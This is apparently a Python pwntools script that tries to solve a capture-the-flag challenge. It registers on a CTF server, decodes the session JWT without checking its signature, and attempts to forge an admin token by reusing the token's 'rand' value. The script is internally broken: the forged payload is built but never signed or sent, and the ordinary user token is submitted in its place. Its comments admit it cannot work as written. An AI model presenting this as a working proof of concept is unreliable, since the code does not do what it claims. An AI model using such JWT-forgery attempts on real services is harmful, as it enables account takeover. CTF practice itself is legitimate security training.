import jwt
from pwn import *

# Connect to the server
conn = remote('ctf.find-it.id', 7301)

# Step 1: Register a normal user to get the rand value
conn.sendlineafter("Enter your choice (1/2/3):", "1")
conn.sendlineafter("Enter your name:", "testuser")
conn.recvuntil("Store this cookie for login: ")
jwt_token = conn.recvline().strip().decode()

# Extract the rand value from the token
decoded = jwt.decode(jwt_token, options={"verify_signature": False})
token_parts = decoded['token'].split('+')
rand_value = token_parts[2]

# Step 2: Forge an admin token with the same rand value
# We need to know the JWT secret to properly sign it, but since we don't have it,
# we might need to try to crack it or find another vulnerability
# Alternatively, if the server doesn't properly verify the signature, we might skip it

# For this example, let's assume we can create our own token with the correct rand
# Note: In a real CTF, you'd need to either find the secret or exploit signature verification

# Create a malicious token (this won't work without the proper secret)
malicious_data = {
    "name": "admin",
    "user_id": 1,
    "token": f"anything+anything+{rand_value}"  # The important part is the rand value
}

# If we had the secret, we would do:
# malicious_token = jwt.encode(malicious_data, secret, algorithm="HS256")
# But since we don't, we'll try with an empty signature or try to crack it

# For this PoC, let's assume we can send the tampered token
# (In a real challenge, you'd need to properly sign it or find a way around verification)

# Step 3: Login as admin with our forged token
conn.sendlineafter("Enter your choice (1/2/3):", "2")
conn.sendlineafter("Enter your name:", "admin")
conn.sendlineafter("Enter your cookie:", jwt_token)  # This would need to be our forged token

# Get the flag
print(conn.recvall().decode())